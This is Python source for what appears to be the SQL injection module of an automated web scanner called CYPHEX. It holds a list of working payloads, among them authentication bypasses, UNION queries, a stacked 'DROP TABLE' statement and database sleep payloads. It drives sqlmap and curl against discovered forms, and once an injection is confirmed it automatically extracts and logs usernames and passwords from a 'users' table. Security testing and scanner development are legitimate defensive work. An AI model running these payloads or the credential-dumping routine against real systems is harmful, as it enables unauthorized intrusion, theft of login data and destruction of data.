"""
CYPHEX — Agent 03: SQL Injection Agent

Tests for SQL injection vulnerabilities:
  - sqlmap automated testing (if available)
  - Manual payload testing via curl on all forms
  - Time-based blind injection detection
  - Error-based detection from response patterns
  - Union-based injection attempts
"""

import re
import shlex
from urllib.parse import quote

from agents.base_agent import BaseAgent
from models.scan import ScanContext, Vuln
from models.agent_result import AgentResult


class SQLiAgent(BaseAgent):

    SQLI_PAYLOADS = [
        # Auth bypass
        ("' OR '1'='1", "auth_bypass"),
        ("admin'--", "comment_bypass"),
        ("' OR 1=1--", "or_bypass"),
        ("\" OR \"\"=\"", "double_quote_bypass"),
        ("' OR 'x'='x", "string_bypass"),
        # Error-based
        ("'", "single_quote"),
        ("1' AND 1=CONVERT(int,@@version)--", "error_mssql"),
        ("' AND extractvalue(1,concat(0x7e,version()))--", "error_mysql"),
        # Union-based
        ("' UNION SELECT 'CYPHEX_UNION_VULN'--", "union_1"),
        ("' UNION SELECT 'CYPHEX_UNION_VULN','CYPHEX_UNION_VULN'--", "union_2"),
        ("' UNION SELECT 'CYPHEX_UNION_VULN','CYPHEX_UNION_VULN','CYPHEX_UNION_VULN'--", "union_3"),
        ("' UNION SELECT username,password FROM users--", "union_dump"),
        # Stacked queries
        ("'; DROP TABLE test--", "stacked"),
        ("1; SELECT pg_sleep(5)--", "stacked_pg"),
    ]

    # Patterns that indicate SQL error (= injection point)
    SQL_ERROR_PATTERNS = [
        r"sql syntax",
        r"mysql_fetch",
        r"sqlite3?\.OperationalError",
        r"pg_query",
        r"pg_exec",
        r"unclosed quotation mark",
        r"quoted string not properly terminated",
        r"sql_debug",
        r"SELECT \* FROM",
        r"syntax error at or near",
        r"unterminated.*string",
        r"ODBC SQL Server Driver",
        r"Microsoft OLE DB Provider for SQL Server",
        r"ORA-\d{5}",
        r"PostgreSQL.*ERROR",
        r"Warning:.*mysql_",
        r"valid MySQL result",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
        r"org\.postgresql\.util\.PSQLException",
    ]

    @staticmethod
    def _q(value: str) -> str:
        """Shell-quote untrusted values before embedding in terminal commands."""
        return shlex.quote(str(value))

    async def run(self, context: ScanContext) -> AgentResult:
        await self.log("═══ SQL INJECTION TESTING ═══", "info")

        # ─── 1. Test sqlmap if available ───
        has_sqlmap = await self.terminal.check_tool("sqlmap")
        if has_sqlmap:
            await self._run_sqlmap(context)

        # ─── 2. Manual payload testing on all forms ───
        await self.log("Testing forms with manual payloads...", "info")
        for form in context.all_forms:
            if not form.inputs:
                continue
            await self._test_form(form, context)

        # ─── 3. Test URL parameters ───
        await self.log("Testing URL parameters...", "info")
        for endpoint in context.all_endpoints:
            if "?" in endpoint:
                await self._test_url_params(endpoint, context)

        # ─── 4. Time-based blind injection on login ───
        login_forms = [
            f for f in context.all_forms
            if any(inp in ['password', 'passwd', 'pass'] for inp in f.inputs)
        ]
        for form in login_forms:
            await self._test_time_based(form, context)

        await self.log(
            f"SQLi testing complete: {len(self.vulns)} vulnerabilities found",
            "success" if not self.vulns else "danger",
        )

        return AgentResult(
            agent="SQLiAgent",
            vulns=self.vulns,
            context=context,
            terminal_logs=self.terminal.command_history,
        )

    async def _run_sqlmap(self, context: ScanContext):
        """Run sqlmap against forms and URL parameters."""
        for form in context.all_forms[:5]:  # Limit to 5 forms
            if form.method.upper() == "POST" and form.inputs:
                data_str = "&".join(f"{k}=test" for k in form.inputs)
                await self.log(f"Running sqlmap on {form.action}...", "info")
                action_q = self._q(form.action)
                data_q = self._q(data_str)
                out_dir_q = self._q(f"{self.terminal.working_dir}/sqlmap")
                out = await self.terminal.run(
                    f'sqlmap -u {shlex.quote(form.action)} '
                    f'--data={shlex.quote(data_str)} '
                    f"--batch --level=3 --risk=2 "
                    f"--threads=4 --random-agent "
                    f"--output-dir={out_dir_q}",
                    timeout=120,
                )
                if "injection point" in out.stdout.lower():
                    await self.add_vuln(Vuln(
                        name=f"SQL Injection (sqlmap confirmed)",
                        severity="Critical",
                        cvss_score=9.8,
                        endpoint=form.action,
                        confirmed=True,
                        evidence=out.stdout[:500],
                        fix="Use parameterized queries. Never concatenate user input into SQL.",
                    ))

    async def _test_form(self, form, context: ScanContext):
        """Test a form with SQL injection payloads."""
        sqli_type = None
        for payload, ptype in self.SQLI_PAYLOADS:  # Test ALL payloads
            # Build form data
            encoded_payload = quote(payload, safe="")

            if form.method.upper() == "POST":
                data_parts = []
                for inp in form.inputs:
                    data_parts.append(f"{inp}={encoded_payload}")
                data_str = "&".join(data_parts)
                action_q = self._q(form.action)
                data_q = self._q(data_str)

                out = await self.terminal.run(
                    f'curl -s -w "\\n__STATUS__%{{http_code}}" '
                    f'-X POST {shlex.quote(form.action)} '
                    f'-d {shlex.quote(data_str)} '
                    f'--max-time 10'
                )
            else:
                params = "&".join(
                    f"{inp}={encoded_payload}" for inp in form.inputs
                )
                url = f"{form.action}?{params}" if "?" not in form.action else f"{form.action}&{params}"
                url_q = self._q(url)
                out = await self.terminal.run(
                    f'curl -s -w "\\n__STATUS__%{{http_code}}" --max-time 10 {shlex.quote(url)}'
                )

            if not out.stdout:
                continue

            # Parse status code
            body = out.stdout
            status = "000"
            if "__STATUS__" in body:
                parts = body.rsplit("__STATUS__", 1)
                body = parts[0]
                status = parts[1].strip()

            # Check for SQL injection indicators
            is_sqli = False
            response_lower = body.lower()

            # Check for SQL error patterns (Error-Based SQLi)
            for pattern in self.SQL_ERROR_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    is_sqli = True
                    sqli_type = "Error-Based"
                    break

            # Check for successful auth bypass (Boolean-Based SQLi)
            if ptype in ["auth_bypass", "comment_bypass", "or_bypass",
                         "double_quote_bypass", "string_bypass"]:
                if any(kw in response_lower for kw in [
                    '"success":true', '"success": true',
                    '"authenticated"', '"token":', 'welcome',
                    'dashboard', 'logged in', 'welcome back'
                ]) and not any(kw in response_lower for kw in [
                    'invalid', 'failed', 'denied'
                ]):
                    is_sqli = True
                    sqli_type = "Boolean-Based (Auth Bypass)"

            # Check for union-based (data returned)
            if ptype.startswith("union"):
                if "cyphex_union_vuln" in response_lower and status == "200":
                    # Ensure it is executing the SQL and NOT just reflecting the input!
                    if "union select" not in response_lower:
                        is_sqli = True
                        sqli_type = "Union-Based"

            # Check if payload is reflected in SQL debug info
            if "sql_debug" in response_lower and payload.replace("'", "") in body:
                is_sqli = True
                sqli_type = sqli_type or "Error-Based (Debug Leak)"

            if is_sqli:
                # ── PROOF: Try to extract real credentials ──
                dumped = ""
                dumped = await self._extract_credentials(form, context)

                await self.add_vuln(Vuln(
                    name=f"SQL Injection ({sqli_type}) -- {form.action}",
                    severity="Critical",
                    cvss_score=9.8,
                    endpoint=form.action,
                    payload=payload,
                    confirmed=True,
                    evidence=body[:300],
                    dumped_data=dumped,
                    description=(
                        f"[{sqli_type}] SQL injection on {form.method} {form.action} "
                        f"via payload: {payload}"
                    ),
                    fix="Use parameterized queries / prepared statements.",
                ))
                break  # Found one, move to next form

    async def _extract_credentials(self, form, context: ScanContext) -> str:
        """After confirming SQLi, attempt to dump real credentials."""
        await self.log("Attempting credential extraction...", "warning")
        dumped = ""

        # Try UNION-based extraction with different column counts
        for cols in range(1, 6):
            nulls = ",".join(["NULL"] * (cols - 1))
            if nulls:
                union_payload = f"' UNION SELECT {nulls},group_concat(username,':::CYPHEX:::',password) FROM users--"
            else:
                union_payload = f"' UNION SELECT group_concat(username,':::CYPHEX:::',password) FROM users--"
            encoded = quote(union_payload, safe="")

            if form.method.upper() == "POST":
                # Put payload only in first field (usually username)
                first_inp = form.inputs[0] if form.inputs else "username"
                data_parts = [f"{first_inp}={encoded}"]
                for inp in form.inputs[1:]:
                    data_parts.append(f"{inp}=test")
                data_str = "&".join(data_parts)
                action_q = self._q(form.action)
                data_q = self._q(data_str)

                out = await self.terminal.run(
                    f'curl -s -X POST {shlex.quote(form.action)} '
                    f'-d {shlex.quote(data_str)} --max-time 10'
                )
            else:
                continue

            if out.stdout and ":::CYPHEX:::" in out.stdout:
                # Look for our explicit delimiter
                cred_match = re.search(
                    r'([a-zA-Z0-9_]+\s*:::CYPHEX:::\s*[a-zA-Z0-9_@!#$%^&*]+)', out.stdout
                )
                if cred_match:
                    dumped = cred_match.group(1).replace(":::CYPHEX:::", ":")
                    await self.log(
                        f"  CREDENTIALS DUMPED: {dumped}", "danger"
                    )
                    break

        # Also try to extract via error-based if union failed
        if not dumped:
            error_payload = quote(
                "' AND 1=CAST((SELECT username||':'||password FROM users LIMIT 1) AS INT)--",
                safe=""
            )
            first_inp = form.inputs[0] if form.inputs else "username"
            data_str = f"{first_inp}={error_payload}"
            action_q = self._q(form.action)
            data_q = self._q(data_str)
            out = await self.terminal.run(
                f'curl -s -X POST {shlex.quote(form.action)} '
                f'-d {shlex.quote(data_str)} --max-time 10'
            )
            if out.stdout:
                cred_match = re.search(
                    r'([a-zA-Z0-9_]+:[a-zA-Z0-9_@!#$%^&*]+)', out.stdout
                )
                if cred_match and cred_match.group(1) not in ['utf-8', 'text:html']:
                    dumped = cred_match.group(1)
                    await self.log(
                        f"  CREDENTIALS DUMPED (error-based): {dumped}", "danger"
                    )

        return dumped

    async def _test_url_params(self, url: str, context: ScanContext):
        """Test URL parameters for SQL injection."""
        for payload, ptype in self.SQLI_PAYLOADS[:5]:
            encoded = quote(payload, safe="")
            # Replace parameter values with payload
            test_url = re.sub(r'=([^&]*)', f'={encoded}', url)
            test_url_q = self._q(test_url)

            out = await self.terminal.run(
                f'curl -s --max-time 10 {shlex.quote(test_url)}'
            )

            if out.stdout:
                for pattern in self.SQL_ERROR_PATTERNS:
                    if re.search(pattern, out.stdout, re.IGNORECASE):
                        await self.add_vuln(Vuln(
                            name=f"SQL Injection — URL param",
                            severity="Critical",
                            cvss_score=9.8,
                            endpoint=url,
                            payload=payload,
                            confirmed=True,
                            evidence=out.stdout[:300],
                            fix="Use parameterized queries.",
                        ))
                        return

    async def _test_time_based(self, form, context: ScanContext):
        """Test for time-based blind SQL injection."""
        await self.log(f"Testing time-based blind on {form.action}...", "info")

        # First, get baseline response time
        baseline_data = "&".join(f"{inp}=test" for inp in form.inputs)
        action_q = self._q(form.action)
        baseline_data_q = self._q(baseline_data)
        baseline = await self.terminal.run(
            f'curl -s -o /dev/null -w "%{{time_total}}" '
            f'-X POST {shlex.quote(form.action)} '
            f'-d {shlex.quote(baseline_data)} '
            f'--max-time 15'
        )

        try:
            baseline_time = float(baseline.stdout.strip().replace("'", ""))
        except (ValueError, AttributeError):
            return

        # Now test with sleep payload
        db = context.database or "mysql"
        sleep_payloads = {
            "mysql": "1' AND SLEEP(5)--",
            "postgresql": "1'; SELECT pg_sleep(5)--",
            "mssql": "1'; WAITFOR DELAY '0:0:5'--",
            "sqlite": "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--",
        }
        payload = sleep_payloads.get(db, sleep_payloads["mysql"])
        encoded_payload = quote(payload, safe="")

        sleep_data = "&".join(
            f"{inp}={encoded_payload}" for inp in form.inputs
        )
        sleep_data_q = self._q(sleep_data)
        out = await self.terminal.run(
            f'curl -s -o /dev/null -w "%{{time_total}}" '
            f'-X POST {shlex.quote(form.action)} '
            f'-d {shlex.quote(sleep_data)} '
            f'--max-time 15'
        )

        try:
            sleep_time = float(out.stdout.strip().replace("'", ""))
        except (ValueError, AttributeError):
            return

        # If response took 4+ seconds longer than baseline
        if sleep_time - baseline_time > 4.0:
            await self.add_vuln(Vuln(
                name="Time-Based Blind SQL Injection",
                severity="Critical",
                cvss_score=9.8,
                endpoint=form.action,
                payload=payload,
                confirmed=True,
                evidence=f"Baseline: {baseline_time}s, With SLEEP: {sleep_time}s",
                description=(
                    f"Time-based blind SQLi confirmed. "
                    f"Response delay: {sleep_time - baseline_time:.1f}s with SLEEP(5)."
                ),
                fix="Use parameterized queries for all SQL operations.",
            ))
